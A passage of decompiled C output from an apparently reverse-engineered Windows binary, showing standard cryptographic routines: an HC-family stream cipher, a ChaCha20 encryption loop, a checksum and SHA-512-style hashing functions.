                 ^ ((((a1[1050] >> 22) | (a1[1050] << 10)) ^ ((a1[v2 + 526] >> 9) | (a1[v2 + 526] << 23)))
                  + (HIBYTE(a1[1043]) | (a1[1043] << 8))
                  + a1[v2 + 525]);
    a1[1053] = a1[v2 + 525];
    a1[v2 + 526] = (a1[(unsigned __int8)BYTE2(a1[1042]) + 256] + a1[*((unsigned __int8 *)a1 + 4168)])
                 ^ ((((a1[1051] >> 22) | (a1[1051] << 10)) ^ ((a1[v2 + 527] >> 9) | (a1[v2 + 527] << 23)))
                  + (HIBYTE(a1[1044]) | (a1[1044] << 8))
                  + a1[v2 + 526]);
    a1[1054] = a1[v2 + 526];
    a1[v2 + 527] = (a1[(unsigned __int8)BYTE2(a1[1043]) + 256] + a1[*((unsigned __int8 *)a1 + 4172)])
                 ^ ((((a1[1052] >> 22) | (a1[1052] << 10))
                   ^ ((a1[(((_WORD)v2 + 16) & 0x1FF) + 512] >> 9) | (a1[(((_WORD)v2 + 16) & 0x1FF) + 512] << 23)))
                  + (HIBYTE(a1[1045]) | (a1[1045] << 8))
                  + a1[v2 + 527]);
    result = (unsigned int)a1[v2 + 527];
    a1[1055] = result;
  }
  else
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    a1[v2] = (a1[(unsigned __int8)BYTE2(a1[1028]) + 768] + a1[*((unsigned __int8 *)a1 + 4112) + 512])
           ^ ((((a1[1037] >> 10) | (a1[1037] << 22)) ^ ((a1[v2 + 1] >> 23) | (a1[v2 + 1] << 9)))
            + ((a1[1030] >> 8) | (a1[1030] << 24))
            + a1[v2]);
    a1[1024] = a1[v2];
    a1[v2 + 1] = (a1[(unsigned __int8)BYTE2(a1[1029]) + 768] + a1[*((unsigned __int8 *)a1 + 4116) + 512])
               ^ ((((a1[1038] >> 10) | (a1[1038] << 22)) ^ ((a1[v2 + 2] >> 23) | (a1[v2 + 2] << 9)))
                + ((a1[1031] >> 8) | (a1[1031] << 24))
                + a1[v2 + 1]);
    a1[1025] = a1[v2 + 1];
    a1[v2 + 2] = (a1[(unsigned __int8)BYTE2(a1[1030]) + 768] + a1[*((unsigned __int8 *)a1 + 4120) + 512])
               ^ ((((a1[1039] >> 10) | (a1[1039] << 22)) ^ ((a1[v2 + 3] >> 23) | (a1[v2 + 3] << 9)))
                + ((a1[1032] >> 8) | (a1[1032] << 24))
                + a1[v2 + 2]);
    a1[1026] = a1[v2 + 2];
    a1[v2 + 3] = (a1[(unsigned __int8)BYTE2(a1[1031]) + 768] + a1[*((unsigned __int8 *)a1 + 4124) + 512])
               ^ ((((a1[1024] >> 10) | (a1[1024] << 22)) ^ ((a1[v2 + 4] >> 23) | (a1[v2 + 4] << 9)))
                + ((a1[1033] >> 8) | (a1[1033] << 24))
                + a1[v2 + 3]);
    a1[1027] = a1[v2 + 3];
    a1[v2 + 4] = (a1[(unsigned __int8)BYTE2(a1[1032]) + 768] + a1[*((unsigned __int8 *)a1 + 4128) + 512])
               ^ ((((a1[1025] >> 10) | (a1[1025] << 22)) ^ ((a1[v2 + 5] >> 23) | (a1[v2 + 5] << 9)))
                + ((a1[1034] >> 8) | (a1[1034] << 24))
                + a1[v2 + 4]);
    a1[1028] = a1[v2 + 4];
    a1[v2 + 5] = (a1[(unsigned __int8)BYTE2(a1[1033]) + 768] + a1[*((unsigned __int8 *)a1 + 4132) + 512])
               ^ ((((a1[1026] >> 10) | (a1[1026] << 22)) ^ ((a1[v2 + 6] >> 23) | (a1[v2 + 6] << 9)))
                + ((a1[1035] >> 8) | (a1[1035] << 24))
                + a1[v2 + 5]);
    a1[1029] = a1[v2 + 5];
    a1[v2 + 6] = (a1[(unsigned __int8)BYTE2(a1[1034]) + 768] + a1[*((unsigned __int8 *)a1 + 4136) + 512])
               ^ ((((a1[1027] >> 10) | (a1[1027] << 22)) ^ ((a1[v2 + 7] >> 23) | (a1[v2 + 7] << 9)))
                + ((a1[1036] >> 8) | (a1[1036] << 24))
                + a1[v2 + 6]);
    a1[1030] = a1[v2 + 6];
    a1[v2 + 7] = (a1[(unsigned __int8)BYTE2(a1[1035]) + 768] + a1[*((unsigned __int8 *)a1 + 4140) + 512])
               ^ ((((a1[1028] >> 10) | (a1[1028] << 22)) ^ ((a1[v2 + 8] >> 23) | (a1[v2 + 8] << 9)))
                + ((a1[1037] >> 8) | (a1[1037] << 24))
                + a1[v2 + 7]);
    a1[1031] = a1[v2 + 7];
    a1[v2 + 8] = (a1[(unsigned __int8)BYTE2(a1[1036]) + 768] + a1[*((unsigned __int8 *)a1 + 4144) + 512])
               ^ ((((a1[1029] >> 10) | (a1[1029] << 22)) ^ ((a1[v2 + 9] >> 23) | (a1[v2 + 9] << 9)))
                + ((a1[1038] >> 8) | (a1[1038] << 24))
                + a1[v2 + 8]);
    a1[1032] = a1[v2 + 8];
    a1[v2 + 9] = (a1[(unsigned __int8)BYTE2(a1[1037]) + 768] + a1[*((unsigned __int8 *)a1 + 4148) + 512])
               ^ ((((a1[1030] >> 10) | (a1[1030] << 22)) ^ ((a1[v2 + 10] >> 23) | (a1[v2 + 10] << 9)))
                + ((a1[1039] >> 8) | (a1[1039] << 24))
                + a1[v2 + 9]);
    a1[1033] = a1[v2 + 9];
    a1[v2 + 10] = (a1[(unsigned __int8)BYTE2(a1[1038]) + 768] + a1[*((unsigned __int8 *)a1 + 4152) + 512])
                ^ ((((a1[1031] >> 10) | (a1[1031] << 22)) ^ ((a1[v2 + 11] >> 23) | (a1[v2 + 11] << 9)))
                 + ((a1[1024] >> 8) | (a1[1024] << 24))
                 + a1[v2 + 10]);
    a1[1034] = a1[v2 + 10];
    a1[v2 + 11] = (a1[(unsigned __int8)BYTE2(a1[1039]) + 768] + a1[*((unsigned __int8 *)a1 + 4156) + 512])
                ^ ((((a1[1032] >> 10) | (a1[1032] << 22)) ^ ((a1[v2 + 12] >> 23) | (a1[v2 + 12] << 9)))
                 + ((a1[1025] >> 8) | (a1[1025] << 24))
                 + a1[v2 + 11]);
    a1[1035] = a1[v2 + 11];
    a1[v2 + 12] = (a1[(unsigned __int8)BYTE2(a1[1024]) + 768] + a1[*((unsigned __int8 *)a1 + 4096) + 512])
                ^ ((((a1[1033] >> 10) | (a1[1033] << 22)) ^ ((a1[v2 + 13] >> 23) | (a1[v2 + 13] << 9)))
                 + ((a1[1026] >> 8) | (a1[1026] << 24))
                 + a1[v2 + 12]);
    a1[1036] = a1[v2 + 12];
    a1[v2 + 13] = (a1[(unsigned __int8)BYTE2(a1[1025]) + 768] + a1[*((unsigned __int8 *)a1 + 4100) + 512])
                ^ ((((a1[1034] >> 10) | (a1[1034] << 22)) ^ ((a1[v2 + 14] >> 23) | (a1[v2 + 14] << 9)))
                 + ((a1[1027] >> 8) | (a1[1027] << 24))
                 + a1[v2 + 13]);
    a1[1037] = a1[v2 + 13];
    a1[v2 + 14] = (a1[(unsigned __int8)BYTE2(a1[1026]) + 768] + a1[*((unsigned __int8 *)a1 + 4104) + 512])
                ^ ((((a1[1035] >> 10) | (a1[1035] << 22)) ^ ((a1[v2 + 15] >> 23) | (a1[v2 + 15] << 9)))
                 + ((a1[1028] >> 8) | (a1[1028] << 24))
                 + a1[v2 + 14]);
    a1[1038] = a1[v2 + 14];
    a1[v2 + 15] = (a1[(unsigned __int8)BYTE2(a1[1027]) + 768] + a1[*((unsigned __int8 *)a1 + 4108) + 512])
                ^ ((((a1[1036] >> 10) | (a1[1036] << 22))
                  ^ ((a1[((_WORD)v2 + 16) & 0x1FF] >> 23) | (a1[((_WORD)v2 + 16) & 0x1FF] << 9)))
                 + ((a1[1029] >> 8) | (a1[1029] << 24))
                 + a1[v2 + 15]);
    result = (unsigned int)a1[v2 + 15];
    a1[1039] = result;
  }
  return result;
}

//----- (00007FF6E55B35D0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B35D0(__int64 a1, __int64 a2, unsigned int a3, int a4)
{
  __int64 result; // rax
  unsigned int i; // [rsp+0h] [rbp-18h]

  *(_DWORD *)(a1 + 4292) = a3;
  *(_DWORD *)(a1 + 4296) = a4;
  for ( i = 0; ; ++i )
  {
    result = a3 >> 5;
    if ( i >= (unsigned int)result )
      break;
    *(_DWORD *)(a1 + 4LL * i + 0x1084) = *(_DWORD *)(a2 + 4LL * i);
  }
  while ( i < 8 )
  {
    *(_DWORD *)(a1 + 4LL * i + 0x1084) = *(_DWORD *)(a1 + 4LL * (i - 4) + 0x1084);
    result = ++i;
  }
  return result;
}

//----- (00007FF6E55B3690) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B3690(_DWORD *a1, __int64 a2)
{
  __int64 result; // rax
  unsigned int i; // [rsp+20h] [rbp-18h]
  unsigned int j; // [rsp+20h] [rbp-18h]
  unsigned int k; // [rsp+20h] [rbp-18h]
  unsigned int m; // [rsp+20h] [rbp-18h]
  unsigned int n; // [rsp+20h] [rbp-18h]
  unsigned int ii; // [rsp+20h] [rbp-18h]
  unsigned int jj; // [rsp+20h] [rbp-18h]
  unsigned int kk; // [rsp+20h] [rbp-18h]
  unsigned int mm; // [rsp+20h] [rbp-18h]

  for ( i = 0; i < a1[1074] >> 5; ++i )
    a1[i + 1065] = *(_DWORD *)(a2 + 4LL * i);
  while ( i < 8 )
  {
    a1[i + 1065] = a1[i + 1061];
    ++i;
  }
  for ( j = 0; j < 8; ++j )
    a1[j] = a1[j + 1057];
  for ( k = 8; k < 0x10; ++k )
    a1[k] = a1[k + 1057];
  for ( m = 16; m < 0x110; ++m )
    a1[m] = m
          + a1[m - 16]
          + ((a1[m - 15] >> 3) ^ ((a1[m - 15] >> 18) | (a1[m - 15] << 14)) ^ ((a1[m - 15] >> 7) | (a1[m - 15] << 25)))
          + a1[m - 7]
          + ((a1[m - 2] >> 10) ^ ((a1[m - 2] >> 19) | (a1[m - 2] << 13)) ^ ((a1[m - 2] >> 17) | (a1[m - 2] << 15)));
  for ( n = 0; n < 0x10; ++n )
    a1[n] = a1[n + 256];
  for ( ii = 16; ii < 0x400; ++ii )
    a1[ii] = a1[ii - 16]
           + ((a1[ii - 15] >> 3)
            ^ ((a1[ii - 15] >> 18) | (a1[ii - 15] << 14))
            ^ ((a1[ii - 15] >> 7) | (a1[ii - 15] << 25)))
           + a1[ii - 7]
           + ((a1[ii - 2] >> 10) ^ ((a1[ii - 2] >> 19) | (a1[ii - 2] << 13)) ^ ((a1[ii - 2] >> 17) | (a1[ii - 2] << 15)))
           + ii
           + 256;
  result = (__int64)a1;
  a1[1056] = 0;
  for ( jj = 0; jj < 0x10; ++jj )
  {
    a1[jj + 1024] = a1[jj + 496];
    result = jj + 1;
  }
  for ( kk = 0; kk < 0x10; ++kk )
  {
    a1[kk + 1040] = a1[kk + 1008];
    result = kk + 1;
  }
  for ( mm = 0; mm < 0x40; ++mm )
  {
    sub_7FF6E55B01F0(a1);
    result = mm + 1;
  }
  return result;
}

//----- (00007FF6E55B3B20) ----------------------------------------------------
_DWORD *__fastcall fn_ChaCha20_Encrypt(__int64 a1, _DWORD *a2, _DWORD *a3, int *a4, unsigned int a5)
{
  _DWORD *result; // rax
  unsigned int i; // [rsp+20h] [rbp-58h]
  int v7[18]; // [rsp+30h] [rbp-48h] BYREF

  while ( a5 >= 0x40 )
  {
    sub_7FF6E55AC840(a2, v7);
    *a4 = v7[0] ^ *a3;
    a4[1] = v7[1] ^ a3[1];
    a4[2] = v7[2] ^ a3[2];
    a4[3] = v7[3] ^ a3[3];
    a4[4] = v7[4] ^ a3[4];
    a4[5] = v7[5] ^ a3[5];
    a4[6] = v7[6] ^ a3[6];
    a4[7] = v7[7] ^ a3[7];
    a4[8] = v7[8] ^ a3[8];
    a4[9] = v7[9] ^ a3[9];
    a4[10] = v7[10] ^ a3[10];
    a4[11] = v7[11] ^ a3[11];
    a4[12] = v7[12] ^ a3[12];
    a4[13] = v7[13] ^ a3[13];
    a4[14] = v7[14] ^ a3[14];
    a4[15] = v7[15] ^ a3[15];
    a5 -= 64;
    a3 += 16;
    result = a4 + 16;
    a4 += 16;
  }
  if ( a5 )
  {
    sub_7FF6E55AC840(a2, v7);
    for ( i = 0; ; ++i )
    {
      result = (_DWORD *)a5;
      if ( i >= a5 )
        break;
      *((_BYTE *)a4 + i) = *((_BYTE *)v7 + i) ^ *((_BYTE *)a3 + i);
    }
  }
  return result;
}

//----- (00007FF6E55B3F80) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B3F80(_BYTE *a1, int a2)
{
  unsigned int i; // [rsp+0h] [rbp-18h]

  for ( i = 0x676E6F64; a2--; i = *((_DWORD *)qword_7FF6E55A4030 + (unsigned __int8)(*a1++ ^ HIBYTE(i))) ^ (i << 8) )
    ;
  return i;
}
// 7FF6E55A4030: using guessed type __int64 qword_7FF6E55A4030[128];

//----- (00007FF6E55B3FF0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B3FF0(__int64 a1)
{
  __int64 result; // rax
  int i; // [rsp+20h] [rbp-18h]

  sub_7FF6E55B47B0(a1);
  result = a1;
  *(_DWORD *)(a1 + 192) = 0;
  for ( i = 0; i < 4; ++i )
  {
    *(_DWORD *)(a1 + 4LL * i + 196) = 0;
    result = (unsigned int)(i + 1);
  }
  return result;
}

//----- (00007FF6E55B4050) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B4050(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax
  int i; // [rsp+20h] [rbp-A8h]
  int j; // [rsp+20h] [rbp-A8h]
  unsigned int v6; // [rsp+24h] [rbp-A4h]
  __int64 v7; // [rsp+30h] [rbp-98h]
  int v8; // [rsp+3Ch] [rbp-8Ch]
  _DWORD v9[34]; // [rsp+40h] [rbp-88h] BYREF
  int v11; // [rsp+E0h] [rbp+18h]

  v11 = a3;
  v7 = a2;
  v6 = a3;
  for ( i = 0; i < 4; ++i )
  {
    *(_DWORD *)(a1 + 4LL * i + 196) += v6;
    v6 = *(_DWORD *)(a1 + 4LL * i + 196) < v6;
  }
  if ( *(_DWORD *)(a1 + 192) && a3 + *(_DWORD *)(a1 + 192) < 128 )
  {
    sub_7FF6E55B7830(a1 + *(int *)(a1 + 192) + 64, a2, a3);
    result = (unsigned int)(v11 + *(_DWORD *)(a1 + 192));
    *(_DWORD *)(a1 + 192) = result;
  }
  else
  {
    while ( v11 + *(_DWORD *)(a1 + 192) >= 128 )
    {
      sub_7FF6E55B7830(a1 + *(int *)(a1 + 192) + 64, v7, 128 - *(_DWORD *)(a1 + 192));
      v7 += 128 - *(_DWORD *)(a1 + 192);
      v11 -= 128 - *(_DWORD *)(a1 + 192);
      for ( j = 0; j < 16; ++j )
      {
        v8 = *(unsigned __int8 *)(a1 + 8 * j + 7 + 64)
           | (*(unsigned __int8 *)(a1 + 8 * j + 6 + 64) << 8)
           | (*(unsigned __int8 *)(a1 + 8 * j + 5 + 64) << 16)
           | (*(unsigned __int8 *)(a1 + 8 * j + 4 + 64) << 24);
        v9[2 * j] = *(unsigned __int8 *)(a1 + 8 * j + 3 + 64)
                  | (*(unsigned __int8 *)(a1 + 8 * j + 2 + 64) << 8)
                  | (*(unsigned __int8 *)(a1 + 8 * j + 1 + 64) << 16)
                  | (*(unsigned __int8 *)(a1 + 8 * j + 64) << 24);
        v9[2 * j + 1] = v8;
      }
      sub_7FF6E55B4800(a1, (__int64)v9);
      *(_DWORD *)(a1 + 192) = 0;
    }
    sub_7FF6E55B7830(a1 + 64, v7, v11);
    result = a1;
    *(_DWORD *)(a1 + 192) = v11;
  }
  return result;
}

//----- (00007FF6E55B43E0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B43E0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  int i; // [rsp+20h] [rbp-B8h]
  int j; // [rsp+20h] [rbp-B8h]
  int k; // [rsp+20h] [rbp-B8h]
  int v6; // [rsp+24h] [rbp-B4h]
  int v7; // [rsp+28h] [rbp-B0h]
  int v8; // [rsp+2Ch] [rbp-ACh]
  unsigned int v9; // [rsp+30h] [rbp-A8h]
  _DWORD v11[4]; // [rsp+40h] [rbp-98h]
  _BYTE v12[136]; // [rsp+50h] [rbp-88h] BYREF

  if ( *(int *)(a1 + 192) < 112 )
    v8 = 112 - *(_DWORD *)(a1 + 192);
  else
    v8 = 240 - *(_DWORD *)(a1 + 192);
  for ( i = 4; i--; v11[i] = (v9 >> 29) | (8 * *(_DWORD *)(a1 + 4LL * i + 196)) )
  {
    if ( i <= 0 )
      v9 = 0;
    else
      v9 = *(_DWORD *)(a1 + 4LL * (i - 1) + 196);
  }
  fn_memset((__int64)v12, 0, v8);
  v12[0] = 0x80;
  sub_7FF6E55B4050(a1, (__int64)v12, v8);
  for ( j = 0; j < 4; ++j )
  {
    v12[4 * j] = HIBYTE(v11[3 - j]);
    v12[4 * j + 1] = BYTE2(v11[3 - j]);
    v12[4 * j + 2] = BYTE1(v11[3 - j]);
    v12[4 * j + 3] = v11[3 - j];
  }
  result = sub_7FF6E55B4050(a1, (__int64)v12, 16);
  for ( k = 0; k < 8; ++k )
  {
    v6 = *(_DWORD *)(a1 + 8LL * k);
    v7 = *(_DWORD *)(a1 + 8LL * k + 4);
    *(_BYTE *)(a2 + 8 * k) = HIBYTE(v6);
    *(_BYTE *)(a2 + 8 * k + 1) = BYTE2(v6);
    *(_BYTE *)(a2 + 8 * k + 2) = BYTE1(v6);
    *(_BYTE *)(a2 + 8 * k + 3) = v6;
    *(_BYTE *)(a2 + 8 * k + 4) = HIBYTE(v7);
    *(_BYTE *)(a2 + 8 * k + 5) = BYTE2(v7);
    *(_BYTE *)(a2 + 8 * k + 6) = BYTE1(v7);
    *(_BYTE *)(a2 + 8 * k + 7) = v7;
    result = (unsigned int)(k + 1);
  }
  return result;
}

//----- (00007FF6E55B4750) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B4750(__int64 a1, int a2, __int64 a3)
{
  _BYTE v4[232]; // [rsp+20h] [rbp-E8h] BYREF

  sub_7FF6E55B3FF0((__int64)v4);
  sub_7FF6E55B4050((__int64)v4, a1, a2);
  return sub_7FF6E55B43E0((__int64)v4, a3);
}

//----- (00007FF6E55B47B0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B47B0(__int64 a1)
{
  __int64 result; // rax
  int i; // [rsp+0h] [rbp-18h]

  for ( i = 0; i < 8; ++i )
  {
    *(_QWORD *)(a1 + 8LL * i) = qword_7FF6E55A4430[i];
    result = (unsigned int)(i + 1);
  }
  return result;
}
// 7FF6E55A4430: using guessed type __int64 qword_7FF6E55A4430[8];

//----- (00007FF6E55B4800) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B4800(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // [rsp+8h] [rbp-420h]
  unsigned int v4; // [rsp+Ch] [rbp-41Ch]
  int v5; // [rsp+10h] [rbp-418h]
  unsigned int v6; // [rsp+14h] [rbp-414h]
  unsigned int v7; // [rsp+14h] [rbp-414h]
  unsigned int v8; // [rsp+14h] [rbp-414h]
  unsigned int v9; // [rsp+14h] [rbp-414h]
  unsigned int v10; // [rsp+14h] [rbp-414h]
  unsigned int v11; // [rsp+14h] [rbp-414h]
  unsigned int v12; // [rsp+14h] [rbp-414h]
  unsigned int v13; // [rsp+14h] [rbp-414h]
  unsigned int v14; // [rsp+14h] [rbp-414h]
  unsigned int v15; // [rsp+14h] [rbp-414h]
  unsigned int v16; // [rsp+14h] [rbp-414h]
  unsigned int v17; // [rsp+14h] [rbp-414h]
  unsigned int v18; // [rsp+14h] [rbp-414h]
  unsigned int v19; // [rsp+14h] [rbp-414h]
  unsigned int v20; // [rsp+14h] [rbp-414h]
  unsigned int v21; // [rsp+14h] [rbp-414h]
  int i; // [rsp+18h] [rbp-410h]
  int j; // [rsp+18h] [rbp-410h]
  int k; // [rsp+18h] [rbp-410h]
  unsigned int v25; // [rsp+20h] [rbp-408h]
  int v26; // [rsp+20h] [rbp-408h]
  int v27; // [rsp+20h] [rbp-408h]
  int v28; // [rsp+20h] [rbp-408h]
  int v29; // [rsp+20h] [rbp-408h]
  int v30; // [rsp+20h] [rbp-408h]
  int v31; // [rsp+20h] [rbp-408h]
  int v32; // [rsp+20h] [rbp-408h]
  int v33; // [rsp+20h] [rbp-408h]
  int v34; // [rsp+20h] [rbp-408h]
  int v35; // [rsp+20h] [rbp-408h]
  int v36; // [rsp+20h] [rbp-408h]
  int v37; // [rsp+20h] [rbp-408h]
  int v38; // [rsp+20h] [rbp-408h]
  int v39; // [rsp+20h] [rbp-408h]
  _BYTE v40[12]; // [rsp+24h] [rbp-404h]
  __int64 v41; // [rsp+30h] [rbp-3F8h]
  __int64 v42; // [rsp+30h] [rbp-3F8h]
  __int64 v43; // [rsp+38h] [rbp-3F0h]
  __int64 v44; // [rsp+38h] [rbp-3F0h]
  __int64 v45; // [rsp+40h] [rbp-3E8h]
  __int64 v46; // [rsp+40h] [rbp-3E8h]
  __int64 v47; // [rsp+48h] [rbp-3E0h]
  __int64 v48; // [rsp+48h] [rbp-3E0h]
  __int64 v49; // [rsp+50h] [rbp-3D8h]
  __int64 v50; // [rsp+50h] [rbp-3D8h]
  __int64 v51; // [rsp+58h] [rbp-3D0h]
  __int64 v52; // [rsp+58h] [rbp-3D0h]
  __int64 v53; // [rsp+60h] [rbp-3C8h]
  __int64 v54; // [rsp+60h] [rbp-3C8h]
  __int64 v55; // [rsp+68h] [rbp-3C0h]
  __int64 v56; // [rsp+68h] [rbp-3C0h]
  __int64 v57; // [rsp+68h] [rbp-3C0h]
  __int64 v58; // [rsp+68h] [rbp-3C0h]
  __int64 v59; // [rsp+68h] [rbp-3C0h]
  __int64 v60; // [rsp+68h] [rbp-3C0h]
  __int64 v61; // [rsp+68h] [rbp-3C0h]
  __int64 v62; // [rsp+68h] [rbp-3C0h]
  int v63; // [rsp+70h] [rbp-3B8h]
  int v64; // [rsp+74h] [rbp-3B4h]
  unsigned int v65; // [rsp+74h] [rbp-3B4h]
  unsigned int v66; // [rsp+84h] [rbp-3A4h]
  int v67; // [rsp+198h] [rbp-290h]
  _QWORD v68[81]; // [rsp+1A0h] [rbp-288h]

  for ( i = 0; i < 16; ++i )
    v68[i] = *(_QWORD *)(a2 + 8LL * i);
  for ( j = 16; j < 80; ++j )
  {
    v64 = ((LODWORD(v68[j - 2]) << 26) | (HIDWORD(v68[j - 2]) >> 6))
        ^ ((8 * HIDWORD(v68[j - 2])) | (LODWORD(v68[j - 2]) >> 29))
        ^ ((LODWORD(v68[j - 2]) << 13) | (HIDWORD(v68[j - 2]) >> 19));
    v66 = ((LODWORD(v68[j - 15]) << 25) | (HIDWORD(v68[j - 15]) >> 7))
        ^ ((LODWORD(v68[j - 15]) << 24) | (HIDWORD(v68[j - 15]) >> 8))
        ^ ((LODWORD(v68[j - 15]) << 31) | (HIDWORD(v68[j - 15]) >> 1));
    v67 = (v64 + v66 < v66)
        + ((LODWORD(v68[j - 2]) >> 6)
         ^ ((8 * LODWORD(v68[j - 2])) | (HIDWORD(v68[j - 2]) >> 29))
         ^ ((HIDWORD(v68[j - 2]) << 13) | (LODWORD(v68[j - 2]) >> 19)))
        + ((LODWORD(v68[j - 15]) >> 7)
         ^ ((HIDWORD(v68[j - 15]) << 24) | (LODWORD(v68[j - 15]) >> 8))
         ^ ((HIDWORD(v68[j - 15]) << 31) | (LODWORD(v68[j - 15]) >> 1)));
    v65 = v64 + v66 + HIDWORD(v68[j - 7]);
    v63 = (v65 < HIDWORD(v68[j - 7])) + v67 + LODWORD(v68[j - 7]);
    HIDWORD(v68[j]) = v65 + HIDWORD(v68[j - 16]);
    LODWORD(v68[j]) = (HIDWORD(v68[j]) < HIDWORD(v68[j - 16])) + v63 + LODWORD(v68[j - 16]);
  }
  v41 = *(_QWORD *)a1;
  v43 = *(_QWORD *)(a1 + 8);
  v45 = *(_QWORD *)(a1 + 16);
  *(_QWORD *)&v40[4] = *(_QWORD *)(a1 + 24);
  v47 = *(_QWORD *)(a1 + 32);
  v49 = *(_QWORD *)(a1 + 40);
  v51 = *(_QWORD *)(a1 + 48);
  v53 = *(_QWORD *)(a1 + 56);
  for ( k = 0; k < 80; k += 8 )
  {
    *(_DWORD *)v40 = ((v47 >> 9)
                    ^ (((_DWORD)v47 << 14) | (HIDWORD(v47) >> 18))
                    ^ (((_DWORD)v47 << 18) | (HIDWORD(v47) >> 14)))
                   + (HIDWORD(v49) & HIDWORD(v47) ^ HIDWORD(v51) & ~HIDWORD(v47));
    v4 = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k]);
    v6 = v4 + HIDWORD(v68[k]);
    v5 = (v6 < HIDWORD(v68[k]))
       + (v4 < HIDWORD(qword_7FF6E55A4470[k]))
       + (*(_DWORD *)v40 < (HIDWORD(v49) & HIDWORD(v47) ^ HIDWORD(v51) & (unsigned int)~HIDWORD(v47)))
       + ((((_DWORD)v47 << 23) | (HIDWORD(v47) >> 9)) ^ (v47 >> 18) ^ (v47 >> 14))
       + (v49 & v47 ^ v51 & ~(_DWORD)v47)
       + LODWORD(qword_7FF6E55A4470[k])
       + LODWORD(v68[k]);
    *(_DWORD *)v40 = v6 + HIDWORD(v53);
    v25 = (v6 + HIDWORD(v53) < HIDWORD(v53)) + v5 + v53;
    v7 = (HIDWORD(v45) & HIDWORD(v43) ^ HIDWORD(v45) & HIDWORD(v41) ^ HIDWORD(v43) & HIDWORD(v41))
       + ((v41 >> 7) ^ (v41 >> 2) ^ ((16 * v41) | (HIDWORD(v41) >> 28)));
    LODWORD(v3) = (*(_QWORD *)v40 + __PAIR64__(v25, *(unsigned int *)&v40[8])) >> 32;
    HIDWORD(v3) = *(_DWORD *)v40 + *(_DWORD *)&v40[8];
    *(_QWORD *)&v40[4] = v3;
    HIDWORD(v54) = v7 + *(_DWORD *)v40;
    LODWORD(v54) = (v7 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v7 < ((unsigned int)(v41 >> 7)
                        ^ (unsigned int)(v41 >> 2)
                        ^ ((16 * (_DWORD)v41) | (HIDWORD(v41) >> 28))))
                 + (v45 & v43 ^ v45 & v41 ^ v43 & v41)
                 + ((((_DWORD)v41 << 25) | (HIDWORD(v41) >> 7))
                  ^ (((_DWORD)v41 << 30) | (HIDWORD(v41) >> 2))
                  ^ (v41 >> 28))
                 + v25;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (__SPAIR64__(v3, HIDWORD(v3)) >> 18) ^ (__SPAIR64__(v3, HIDWORD(v3)) >> 14))
                   + (HIDWORD(v47) & HIDWORD(v3) ^ HIDWORD(v49) & ~HIDWORD(v3));
    v26 = (*(_DWORD *)v40 < (HIDWORD(v47) & HIDWORD(v3) ^ HIDWORD(v49) & (unsigned int)~HIDWORD(v3)))
        + ((__SPAIR64__(v3, HIDWORD(v3)) >> 9) ^ (v3 >> 18) ^ (v3 >> 14))
        + (v47 & v3 ^ v49 & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 1]);
    v8 = HIDWORD(v3) + HIDWORD(v68[k + 1]);
    *(_DWORD *)v40 = v8 + HIDWORD(v51);
    v27 = (v8 + HIDWORD(v51) < HIDWORD(v51))
        + (v8 < HIDWORD(v68[k + 1]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 1]))
        + v26
        + LODWORD(qword_7FF6E55A4470[k + 1])
        + LODWORD(v68[k + 1])
        + v51;
    v9 = (HIDWORD(v43) & HIDWORD(v41) ^ HIDWORD(v43) & HIDWORD(v54) ^ HIDWORD(v41) & HIDWORD(v54))
       + ((v54 >> 7) ^ (v54 >> 2) ^ ((16 * v54) | (HIDWORD(v54) >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v45);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v45)) < HIDWORD(v45)) + v27 + v45;
    v46 = v3;
    HIDWORD(v52) = v9 + *(_DWORD *)v40;
    LODWORD(v52) = (v9 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v9 < ((unsigned int)(v54 >> 7)
                        ^ (unsigned int)(v54 >> 2)
                        ^ ((16 * (_DWORD)v54) | (HIDWORD(v54) >> 28))))
                 + (v43 & v41 ^ v43 & v54 ^ v41 & v54)
                 + ((((_DWORD)v54 << 25) | (HIDWORD(v54) >> 7))
                  ^ (((_DWORD)v54 << 30) | (HIDWORD(v54) >> 2))
                  ^ (v54 >> 28))
                 + v27;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (((_DWORD)v3 << 14) | (HIDWORD(v3) >> 18))
                                ^ (((_DWORD)v3 << 18) | (HIDWORD(v3) >> 14)))
                   + (*(_DWORD *)&v40[8] & HIDWORD(v3) ^ HIDWORD(v47) & ~HIDWORD(v3));
    v28 = (*(_DWORD *)v40 < (*(_DWORD *)&v40[8] & HIDWORD(v3) ^ HIDWORD(v47) & (unsigned int)~HIDWORD(v3)))
        + ((((_DWORD)v3 << 23) | (HIDWORD(v3) >> 9)) ^ (v3 >> 18) ^ (v3 >> 14))
        + (*(_DWORD *)&v40[4] & v3 ^ v47 & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 2]);
    v10 = HIDWORD(v3) + HIDWORD(v68[k + 2]);
    *(_DWORD *)v40 = v10 + HIDWORD(v49);
    v29 = (v10 + HIDWORD(v49) < HIDWORD(v49))
        + (v10 < HIDWORD(v68[k + 2]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 2]))
        + v28
        + LODWORD(qword_7FF6E55A4470[k + 2])
        + LODWORD(v68[k + 2])
        + v49;
